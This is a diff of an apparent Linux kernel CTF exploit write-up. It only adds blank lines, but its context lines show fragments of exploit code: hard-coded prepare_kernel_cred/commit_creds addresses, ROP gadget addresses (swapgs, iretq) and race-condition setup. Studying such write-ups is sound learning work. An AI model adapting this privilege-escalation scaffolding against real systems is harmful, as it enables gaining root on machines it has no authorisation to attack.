@@ -120,15 +120,24 @@ exp：
 //gcc -o exp exp.c -static
 
 #include <stdio.h>
+
 #include <pthread.h>
+
 #include <unistd.h>
+
 #include <stdlib.h>
+
 #include <sys/ioctl.h>
+
 #include <sys/types.h>
+
 #include <sys/stat.h>
+
 #include <fcntl.h>
 
+
 #define KERNCALL __attribute__((regparm(3)))
+
 
 void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xffffffff810b9d80; // TODO:change it
 void (*commit_creds)(void*) KERNCALL = (void*) 0xffffffff810b99d0; // TODO:change it
@@ -244,16 +253,20 @@ struct file {
  
      u64            f_version;
 #ifdef CONFIG_SECURITY
+
      void            * f_security;
 #endif
+
      / * needed for tty driver, and maybe others * /
      void            * private_data;
  
 #ifdef CONFIG_EPOLL
+
      / * Used by fs / eventpoll.c to link all the hooks to this file * /
      struct list_head    f_ep_links;
      struct list_head    f_tfile_llink;
 #endif /* #ifdef CONFIG_EPOLL */
+
      struct address_space    * f_mapping;
      errseq_t        f_wb_err;
      errseq_t        f_sb_err; / * for syncfs * /
@@ -397,26 +410,42 @@ exp:
 
 ```c
 #include <stdio.h>
+
 #include <stdlib.h>
+
 #include <fcntl.h>
+
 #include <string.h>
+
 #include <unistd.h>
+
 #include <pthread.h>
 
+
 #include <sys/wait.h>
+
 #include <sys/stat.h>
+
 #include <sys/types.h>
 
+
 #define pop_rdi_ret 0xFFFFFFFF813EAD2C
+
 #define swapgs_popfq_ret 0xFFFFFFFF81C00EAE // swapgs; popfq; pop rbp; ret;
+
 #define iretq 0xFFFFFFFF81025A56	// iretq; pop rbp; ret;
+
 #define xchg_rax_rdi 0xFFFFFFFF81768EF2
+
 #define vmlinux_base 0xFFFFFFFF81000000
+
 #define dev_text_base 0xFFFFFFFFC0000000
 
 
 
+
 #define KERNCALL __attribute__((regparm(3)))
+
 
 void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xffffffff8108d690; // TODO:change it
 void (*commit_creds)(void*) KERNCALL = (void*) 0xffffffff8108d340; // TODO:change it
@@ -578,9 +607,13 @@ int main()
 
 ```c
 #include <stdio.h>
+
 #include <fcntl.h>
+
 #include <sys/ioctl.h>
+
 #include <pthread.h>
+
 
 unsigned long long flag_addr;
 int Time = 1000;
